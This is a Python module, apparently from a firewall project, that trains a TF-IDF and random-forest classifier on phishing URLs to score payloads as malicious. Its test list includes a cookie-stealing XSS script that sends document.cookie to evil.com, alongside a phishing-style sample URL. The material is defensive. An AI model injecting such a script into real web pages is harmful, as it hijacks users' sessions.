"""
firewall/plaintext_classifier.py
Plaintext payload classifier using TF-IDF + RandomForest.
Trained on real phishing URL/text data to detect malicious plaintext payloads.
"""

import os
import numpy as np
import joblib
from pathlib import Path
from typing import Optional

from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score, classification_report

# ── Paths ──────────────────────────────────────────────────────────────────────
MODEL_DIR = Path(__file__).resolve().parent / "saved_models"
MODEL_FILE = MODEL_DIR / "plaintext_rf_model.joblib"
TFIDF_FILE = MODEL_DIR / "plaintext_tfidf.joblib"

_model = None
_vectorizer = None


# ── Training ───────────────────────────────────────────────────────────────────

def train_model(max_samples: int = 80000, save: bool = True) -> dict:
    """
    Train the plaintext payload classifier on real URL/text data.

    Uses: HuggingFace testpj/phishing-dataset
    Applies TF-IDF on the URL strings as a proxy for plaintext payload analysis.
    The character-level and token-level patterns in malicious URLs mirror
    many features found in malicious plaintext payloads (obfuscation, encoding, etc.).

    Args:
        max_samples: Maximum samples to use.
        save: Whether to save the model.

    Returns:
        Dict with accuracy and classification report.
    """
    global _model, _vectorizer

    from datasets import load_dataset

    print("[PlaintextClassifier] Loading HuggingFace dataset 'pirocheto/phishing-url'...")
    try:
        train_ds = load_dataset("pirocheto/phishing-url", split="train")
        test_ds = load_dataset("pirocheto/phishing-url", split="test")
        from datasets import concatenate_datasets
        dataset = concatenate_datasets([train_ds, test_ds])
    except Exception:
        dataset = load_dataset("pirocheto/phishing-url", split="train")

    urls = dataset["url"]
    raw_labels = dataset["status"]
    labels = [1 if str(lbl).lower() == "phishing" else 0 for lbl in raw_labels]

    # Sample if needed
    if len(urls) > max_samples:
        indices = np.random.RandomState(42).choice(
            len(urls), size=max_samples, replace=False
        )
        urls = [urls[i] for i in indices]
        labels = [labels[i] for i in indices]
        print(f"[PlaintextClassifier] Sampled to {len(urls)} entries")

    # TF-IDF vectorization on URL text (character n-grams for payload patterns)
    print("[PlaintextClassifier] Applying TF-IDF vectorization (char n-grams)...")
    _vectorizer = TfidfVectorizer(
        analyzer="char_wb",       # Character-level with word boundaries
        ngram_range=(3, 5),       # 3-5 char n-grams
        max_features=10000,       # Limit feature space
        sublinear_tf=True,
    )

    X = _vectorizer.fit_transform(urls)
    y = np.array(labels, dtype=np.int32)

    print(f"[PlaintextClassifier] TF-IDF matrix: {X.shape}")

    # Split
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42, stratify=y
    )

    # Train
    print("[PlaintextClassifier] Training RandomForestClassifier...")
    _model = RandomForestClassifier(
        n_estimators=100,
        random_state=42,
        n_jobs=-1,
        class_weight="balanced",
    )
    _model.fit(X_train, y_train)

    # Evaluate
    y_pred = _model.predict(X_test)
    acc = accuracy_score(y_test, y_pred)
    report = classification_report(
        y_test, y_pred,
        target_names=["Benign", "Malicious"]
    )

    print(f"\n[PlaintextClassifier] === EVALUATION RESULTS ===")
    print(f"Accuracy: {acc:.4f}")
    print(f"\nClassification Report:\n{report}")

    # Save
    if save:
        os.makedirs(MODEL_DIR, exist_ok=True)
        joblib.dump(_model, MODEL_FILE)
        joblib.dump(_vectorizer, TFIDF_FILE)
        print(f"[PlaintextClassifier] Model saved to {MODEL_DIR}")

    return {"accuracy": acc, "classification_report": report}


def load_saved_model() -> bool:
    """Load previously saved plaintext classifier."""
    global _model, _vectorizer
    if not MODEL_FILE.exists():
        return False
    try:
        _model = joblib.load(MODEL_FILE)
        _vectorizer = joblib.load(TFIDF_FILE)
        print(f"[PlaintextClassifier] Loaded saved model from {MODEL_DIR}")
        return True
    except Exception as e:
        print(f"[PlaintextClassifier] Error loading: {e}")
        return False


# ── Prediction ─────────────────────────────────────────────────────────────────

def predict_plaintext(payload_str: str) -> float:
    """
    Predict the probability that a plaintext payload is malicious.

    Args:
        payload_str: The plaintext string (URL, payload, or text) to evaluate.

    Returns:
        Float between 0.0 (benign) and 1.0 (malicious).
    """
    global _model, _vectorizer

    if _model is None or _vectorizer is None:
        if not load_saved_model():
            raise RuntimeError(
                "No trained plaintext model. Call train_model() first."
            )

    x = _vectorizer.transform([payload_str])
    probas = _model.predict_proba(x)
    # Return probability of class 1 (malicious)
    mal_idx = list(_model.classes_).index(1)
    return float(probas[0][mal_idx])


if __name__ == "__main__":
    print("=" * 70)
    print("PLAINTEXT CLASSIFIER — Training on real dataset")
    print("=" * 70)
    results = train_model(max_samples=50000)
    print(f"\nFinal accuracy: {results['accuracy']:.4f}")

    # Test payloads
    test_payloads = [
        "GET /index.html HTTP/1.1",
        "http://login-verify-secure-update.xyz/account?id=13371337",
        "Hello world this is a normal text message",
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    ]
    print("\nSample predictions:")
    for p in test_payloads:
        score = predict_plaintext(p)
        label = "MALICIOUS" if score > 0.5 else "BENIGN"
        print(f"  [{label}] {score:.4f} — {p[:60]}")
